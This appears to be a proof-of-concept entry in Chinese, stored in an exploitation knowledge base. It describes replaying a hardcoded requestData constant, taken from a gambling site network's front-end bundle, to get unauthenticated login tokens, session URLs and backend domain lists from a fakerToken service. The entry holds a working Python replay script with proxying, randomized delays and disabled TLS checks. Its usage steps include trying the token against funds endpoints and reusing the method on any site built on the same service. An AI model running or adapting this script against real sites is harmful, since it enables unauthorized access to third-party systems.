# fakerToken 硬编码 requestData 常量重放：未认证签发 OB 平台登录 token 与线路后端域名表（RB88/OB 站群通用）

- **code**: fakertoken-硬编码-requestdata-常量重放-未认证签发-ob-平台登录-token-与线路后端域名表-rb88-ob-站群通用
- **kind**: poc
- **category**: unauthorized
- **component**: fakerToken（RB88/OB 体育站群内部 token 签发服务，Spring Boot）
- **versions**: example.com 主包 index-10-09-17-42-CL2wXCgB.js（2026-10-09 构建）；uedsport.gosportsixsixsix.com 当前版本
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-10/11 在靶标 example.com（asset_id=1，203.0.113.111）上实测：POST https://example.com/ob/v2/getTryToken，body `product=rb&requestData=<704 字符常量>`，无任何 Cookie/认证头 → HTTP 200 {"code":"10000","success":true,"data":{"code":"0000","data":{"token":"8b2af1ff66e9aceb5e5b4d981ac82e1a332ed22b","userId":"528925123876225549","loginUrl":"https://user-pc-new.lzy21.com?token=…&sessionId=52892512387622554917916586450061","apiDomain":"https://api.02o5mm35.com","apiDomainList":"https://api.4nrxji5w.com,https://api.iyuiydf.com,https://api.g929im6.com"}}}；重复调用 token 恒定、仅 sessionId 递增（固定静态凭据）。同常量打 /fbsport/v1/getToken → 200 返回 12 组线路域名（wss://push.9r9o.com、https://player.online909.com、https://example.com 等，与 vuln 9 合并计 20 个域名）。反向验证：该 token 不能认证 RB88 资金后端（9 次四种注入方式全部 code 20000 未登录）；附加 userId/uid/obUserId 参数均 50040。证据：runs/fake_token_resp.json、runs/blob_full.txt，库内 vuln 13 + http_evidence 9/10 + chain seq 12/13。
- **path**: pocs/fakertoken-硬编码-requestdata-常量重放-未认证签发-ob-平台登录-token-与线路后端域名表-rb88-ob-站群通用/poc.txt
- **tags**: fakerToken,rb88,博彩站群,未授权,token签发,硬编码常量,requestData,信息泄露
- **created_at**: 2026-10-10T19:02:17.020Z
- **found_by**: exploit

## 描述

RB88/OB 系博彩站群的 fakerToken 服务接口在**不需要任何认证**的情况下，只要带上前端 JS 里硬编码的那一个 704 字符 requestData 常量（base64、528 字节、16 字节对齐，非 zlib，疑似 AES 密文），就能换到：
・`/ob/v2/getTryToken` → OB 平台登录 token + 可直接登录的 loginUrl + sessionId + apiDomain（token 是固定静态值，多次调用不变）；
・`/fbsport/v1/getToken` → 线路后端域名路由表（含 wss 推送、H5、PC、动画、订单详情、播放器与多个 API 域名）；
・`/common/v1/hotLegues/getHotLegues` → 真实赛事数据。
关键点：该常量在前端是**静态字面量**、前端不做本地加密，所以任何人复制即可重放。Content-Type 必须是 application/x-www-form-urlencoded（用 JSON 会返回 50040 系统错误）。附加 userId/uid/obUserId/platId/channel 参数会被忽略（50040），**不能指定他人身份签发**；该 token 也**不能**用于认证同站群的资金后端（RB88 后端 header token / token_x / Bearer / Cookie 四种注入方式全部 20000 未登录）。
复用方法：对任意使用同一套 fakerToken（服务注册表 FAKER_TOKEN / FAKER_TOKEN_BASE_URL）的站点，抓它的主包 → 正则取 requestData 常量 → 用本 POC 脚本重放三个端点即可。属于"通用可复用"技能，故入知识库。

## 用法

```
1) 取目标站点主包（形如 https://<站点>/assets/index-*.js），提取常量：
   python -c "import re;t=open('index.js').read();print(re.findall(r'requestData:\"([A-Za-z0-9+/=]{40,})\"',t)[0])"
2) 填进脚本 BLOB，运行：
   python fakertoken_replay.py            # 依次打 /ob/v2/getTryToken、/fbsport/v1/getToken、/common/v1/hotLegues/getHotLegues
3) 需要走隧道出口时把 PROXY 设为 http://127.0.0.1:7892；直连时设 None。
4) 拿到 token 后先用 header token / token_x / Authorization: Bearer / Cookie 四种方式回打目标站点资金接口，确认该 token 是否被后端接受（多数情况下只对 OB/FB 体育产品有效）。
```

## 正文

```
#!/usr/bin/env python3
# fakerToken 硬编码 requestData 常量重放（RB88/OB 站群通用）
# 实测靶标: example.com 前端主包 index-10-09-17-42-CL2wXCgB.js
import re, sys, json, os, random, time, urllib.parse
import requests, urllib3
urllib3.disable_warnings()

PROXY = 'http://127.0.0.1:7892'          # 走隧道出口时填；直连设 None
HOST  = 'example.com'  # fakerToken 服务（取自主包 FAKER_TOKEN_BASE_URL）
P = {'http': PROXY, 'https': PROXY} if PROXY else None
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.52 Safari/537.36'

# 1) 从主包提取常量：正则 requestData:"<base64>"
def extract_blob(main_js_path):
    t = open(main_js_path, encoding='utf-8', errors='replace').read()
    m = re.findall(r'requestData\s*:\s*"([A-Za-z0-9+/=]{40,})"', t)
    if not m:
        sys.exit('[!] 未找到 requestData 常量，确认这是 Vite 主包而不是 chunk')
    return m[0]

def post(path, data, tag):
    time.sleep(random.uniform(0.6, 1.6))
    h = {'Host': HOST, 'User-Agent': UA, 'Accept': 'application/json, text/plain, */*',
         'Origin': 'https://example.com', 'Referer': 'https://example.com/',
         'Content-Type': 'application/x-www-form-urlencoded'}   # 必须 form，用 JSON 会 50040
    r = requests.post('https://' + HOST + path, headers=h, data=data,
                      proxies=P, verify=False, timeout=25)
    print('[%s] HTTP %s' % (tag, r.status_code))
    try:
        print(json.dumps(r.json(), ensure_ascii=False, indent=1)[:3000])
    except Exception:
        print(r.text[:1500])
    return r

if __name__ == '__main__':
    blob = extract_blob(sys.argv[1] if len(sys.argv) > 1 else 'index.js')
    print('[*] requestData 常量长度 = %d' % len(blob))
    enc = urllib.parse.quote(blob, safe='')
    # 2) OB 平台登录 token（未认证签发）
    post('/ob/v2/getTryToken', 'product=rb&requestData=' + enc, 'getTryToken')
    # 3) 线路后端域名路由表
    post('/fbsport/v1/getToken', {'requestData': blob}, 'getToken')
    # 4) 真实赛事数据
    post('/common/v1/hotLegues/getHotLegues', 'requestData=' + enc, 'hotLegues')

```
